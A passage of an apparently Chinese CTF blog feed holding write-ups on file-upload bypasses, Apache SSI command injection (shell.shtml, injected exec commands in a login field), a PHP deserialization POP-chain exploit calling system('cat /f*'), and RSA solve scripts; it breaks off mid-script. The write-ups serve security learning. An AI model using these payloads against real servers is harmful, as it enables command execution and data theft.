alt="image-20240114201530423"></p><p>move_upload_file()会忽略文件末尾的.&#x2F;</p><p><img src="/../images/image-20240114201839844.png" alt="image-20240114201839844"></p><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><p>数组绕过</p><p><img src="/../images/image-20240114202827590.png" alt="image-20240114202827590"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pass-01&quot;&gt;&lt;a href=&quot;#pass-01&quot; class=&quot;headerlink&quot; title=&quot;pass-01&quot;&gt;&lt;/a&gt;pass-01&lt;/h1&gt;&lt;p&gt;第一关前端js校验&lt;/p&gt;
&lt;h2 id=&quot;修改前端js代码&quot;&gt;&lt;a href=&quot;#修改前端js代码</summary>
      
    
    
    
    
    <category term="文件上传 web安全" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SSI远程命令执行</title>
    <link href="http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/12/31/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-12-31T13:25:44.000Z</published>
    <updated>2023-12-31T13:42:00.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前没有听过这个漏洞，在做BUUCTF一道题中发现了，学习一下。</p><h1 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。但是如果目标服务器<strong>开启了SSI和CGI支持</strong>，我们可以上传一个shtml文件，并构造命令执行来进行利用。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传shell.shtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd==&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231213248547.png" alt="image-20231231213248547"></p><p>访问，成功执行</p><p><img src="/../images/image-20231231213331385.png" alt="image-20231231213331385"></p><p>参考链接：</p><p><a href="https://www.hacking8.com/bug-product/Apache-SSI/Apache-SSI-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">Apache-SSI-远程命令执行漏洞</a></p><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>前面不再赘述，这里从登录成功开始。</p><p>如图，正确的账号密码登录</p><p><img src="/../images/image-20231231212333674.png" alt="image-20231231212333674"></p><p>可以发现生成了一个shtml文件</p><p>访问</p><p><img src="/../images/image-20231231212351223.png" alt="image-20231231212351223"></p><p>观察一下，admin是username的值，被输出，结合会生成shtml文件，猜想会不会存在SSI远程命令执行漏洞</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=20206666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231212208158.png" alt="image-20231231212208158"></p><p>访问，可以看到flag文件</p><p><img src="/../images/image-20231231212146502.png" alt="image-20231231212146502"></p><p>读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231231214137226.png" alt="image-20231231214137226"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前没有听过这个漏洞，在做BUUCTF一道题中发现了，学习一下。&lt;/p&gt;
&lt;h1 id=&quot;Apache-SSI远程命令执行漏洞&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="ctf RCE" scheme="http://example.com/tags/ctf-RCE/"/>
    
  </entry>
  
  <entry>
    <title>Fast destruct</title>
    <link href="http://example.com/2023/12/27/Fast-destruct/"/>
    <id>http://example.com/2023/12/27/Fast-destruct/</id>
    <published>2023-12-27T04:43:37.000Z</published>
    <updated>2023-12-27T05:13:15.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是Fast-destruct"><a href="#什么是Fast-destruct" class="headerlink" title="什么是Fast destruct"></a>什么是Fast destruct</h1><p>在php中，有</p><ul><li>如果单独执行<strong>unserialize</strong>函数进行反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类也就没有了，在有析构函数的情况下就会执行它</li><li>如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量中，当这个对象被销毁时才会执行其析构函数。</li></ul><p>通俗来讲，就是php中的所有类只有在php代码渲染页面渲染结束后才会被销毁，只有销毁的时候才能触发**__destruxct()<strong>函数，一旦出现报错或者代码终止就不会触发</strong>destruct**函数。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><strong>unserialize</strong>函数反序列化过程：</p><p><strong>获取反序列化字符串-&gt;根据类型进行反序列化-&gt;找到对应反序列化类-&gt;根据字符判断元素个数-&gt;创建对象-&gt;迭代解析剩下的字符串-&gt;判断是否有__wakeup()并标记-&gt;释放空间并判断是否具有标记-&gt;调用</strong></p><p>整个过程逐步对对象进行解析，而且会根据相应的魔法函数标记去调用。即使完整的反序列化失败，涉及到的对象仍然可以触发魔法函数进行调用。</p><p>而<strong>Fast destruct</strong>的目的就是利用<strong>unserialize</strong>运行失败后会对已经创建的类进行销毁这一特性去<strong>提前触发__destruct()函数</strong></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p><strong>NewStarCTF 2023 公开赛道 More Fast</strong></p><p>这道题描述如下</p><p><img src="/../images/image-20231227130402440.png" alt="image-20231227130402440"></p><p>来看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>直接构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><strong>但是末尾有</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个throw就是**GC回收(垃圾回收机制)**，会回收被销毁的类，导致__destruct()检测不到被销毁的类，也就无法触发</p><p>所以我们需要提前触发__destruct()来进行绕过</p><h2 id="修改序列化数字元素个数"><a href="#修改序列化数字元素个数" class="headerlink" title="修改序列化数字元素个数"></a>修改序列化数字元素个数</h2><p>正常序列化后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231227131019178.png" alt="image-20231227131019178"></p><h2 id="去掉序列化尾部"><a href="#去掉序列化尾部" class="headerlink" title="去掉序列化尾部"></a>去掉序列化尾部</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>最后cat &#x2F;f</strong>*</p><p><img src="/../images/image-20231227131119013.png" alt="image-20231227131119013"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是Fast-destruct&quot;&gt;&lt;a href=&quot;#什么是Fast-destruct&quot; class=&quot;headerlink&quot; title=&quot;什么是Fast destruct&quot;&gt;&lt;/a&gt;什么是Fast destruct&lt;/h1&gt;&lt;p&gt;在php中，有&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    
    <category term="CTF php" scheme="http://example.com/tags/CTF-php/"/>
    
  </entry>
  
  <entry>
    <title>初探RSA算法</title>
    <link href="http://example.com/2023/12/25/%E5%88%9D%E6%8E%A2RSA%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2023/12/25/%E5%88%9D%E6%8E%A2RSA%E7%AE%97%E6%B3%95/</id>
    <published>2023-12-24T16:11:51.000Z</published>
    <updated>2023-12-24T16:15:17.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h1><p>RSA算法是现今使用最广泛的公钥密码算法。</p><p>根据密钥使用方法，可以将密码分为对称加密和非对称加密</p><ul><li>对称加密：加密和解密使用同一种密钥</li><li>公钥加密：加密和解密使用不同密钥</li></ul><p>RSA加密过程可以使用一个通式来表示</p><p><img src="/../images/image-20231224224841165.png" alt="image-20231224224841165"></p><p>也就是说RSA加密是对明文的E次方除以N后求余数的过程</p><p>只要知道E和N，任何人都可以进行RSA加密，所以E和N的组合就是公钥，用(E,N)来表示</p><p>E是加密(Encryption)，N是数字(Number)</p><h1 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h1><p>同样的，RSA解密也可以使用一个通式来表示</p><p><img src="/../images/image-20231224225157077.png" alt="image-20231224225157077"></p><p>RSA解密就是对密文的D次方除以N后求余数的过程</p><p>知道D和N就可以进行解密，所以D和N的组合就是私钥，用(D,N)表示</p><p>D是解密(Decryption),N是数字</p><h1 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h1><p>公钥是(E,N)，私钥是(D,N)，所以密钥对是(E,D,N)</p><p>密钥生成步骤如下:</p><ol><li><strong>求N</strong></li><li><strong>求L(计算过程的中间数)</strong></li><li><strong>求E</strong></li><li><strong>求D</strong></li></ol><h2 id="求N"><a href="#求N" class="headerlink" title="求N"></a>求N</h2><p>两个质数p，q(不能太小，容易破解)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N = p * q</span><br></pre></td></tr></table></figure><h2 id="求欧拉函数φ-N"><a href="#求欧拉函数φ-N" class="headerlink" title="求欧拉函数φ(N)"></a>求欧拉函数φ(N)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">φ(N) = (p-1) * (q-1)</span><br></pre></td></tr></table></figure><h2 id="求E"><a href="#求E" class="headerlink" title="求E"></a>求E</h2><p>E需要满足两个条件</p><ul><li><strong>1 &lt; E &lt; φ(N)</strong></li><li><strong>gcd(E,φ(N)) &#x3D; 1(E和φ(N)最大公约数为1，即互质。)</strong></li></ul><p>需要E和φ(N)的最大公约数为1是为了保证一定存在解密时需要使用的数D。</p><h2 id="求D"><a href="#求D" class="headerlink" title="求D"></a>求D</h2><p>D由E计算出来，需要满足以下条件</p><ul><li><strong>1 &lt; D &lt; φ(N)</strong></li><li><strong>(E * D) mod φ(N) &#x3D; 1</strong></li></ul><p>只要D满足以上两个条件，由E和N进行加密的密文就可以使用D和N进行解密。</p><p>d可以使用**gmpy2.invert(e,φ(N))**求逆元快速计算出来。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="python-gmpy2库"><a href="#python-gmpy2库" class="headerlink" title="python gmpy2库"></a>python gmpy2库</h2><p>**GMP(GNU Multiple Precision Arithmetic Library，即GNU高精度算术运算库)**，是一个开源的高精度运算库，其中不但有整数、实数、浮点数的高精度运算，还有随机数生成，尤其提供了非常完备的数论中的运算接口，比如Miller-Rabin素数测试算法、大素数生成、欧几里德算法、求域中元素的逆、Jacobi符号、legendre符号等。</p><p>gmpy2是python的一个扩展库，是对GMP的封装，前身是gmpy。</p><p><strong>常用函数：</strong></p><ul><li><strong>powmod(a,n,p)</strong> 对于给定的整数p,n,a,计算aⁿ mod p</li><li><strong>iroot(x,n)</strong>  对x开n次方根</li><li><strong>gcd(,a,b)</strong>  求得a,b最大公约数</li><li><strong>lcm(a,b)</strong>  求得最小公倍数</li><li><strong>invert(x,m)</strong>  求大整数x模m的逆元</li><li><strong>mpz()</strong>  初始化大整数</li></ul><h2 id="long-to-bytes"><a href="#long-to-bytes" class="headerlink" title="long_to_bytes()"></a>long_to_bytes()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br></pre></td></tr></table></figure><p>将正整数转化为byte类型字符串</p><h2 id="BUUCTF-Crypto-RSA"><a href="#BUUCTF-Crypto-RSA" class="headerlink" title="[BUUCTF-Crypto]RSA"></a>[BUUCTF-Crypto]RSA</h2><p>题目描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d作为flga提交</span><br></pre></td></tr></table></figure><p>这里是已知p,q,e求d</p><p>前面提到，d可以d可以使用**gmpy2.invert(e,φ(N))<strong>求逆元快速计算，并且</strong>φ(N) &#x3D; (p-1) * (q-1)**，可以直接写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line">p=<span class="number">473398607161</span></span><br><span class="line">q=<span class="number">4511491</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231224234655961.png" alt="image-20231224234655961"></p><p>最终flag为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;125631357777427553&#125;</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-Crypto-rsarsa"><a href="#BUUCTF-Crypto-rsarsa" class="headerlink" title="[BUUCTF-Crypto]rsarsa"></a>[BUUCTF-Crypto]rsarsa</h2><p>题目描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>已知p、q、e，c，求m</p><p>首先可以根据p和q求出n和L，然后根据e和l求出d，最后根据**m&#x3D;pow(c,d,n)**求出m</p><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">L = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,L)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231224235558624.png" alt="image-20231224235558624"></p><p>最终flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5577446633554466577768879988&#125;</span><br></pre></td></tr></table></figure><h2 id="琢光杯2023-初见RSA"><a href="#琢光杯2023-初见RSA" class="headerlink" title="[琢光杯2023] 初见RSA"></a>[琢光杯2023] 初见RSA</h2><p>解题思路跟上题差不多，由于平台关了我这没有保存题目描述。只有解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> 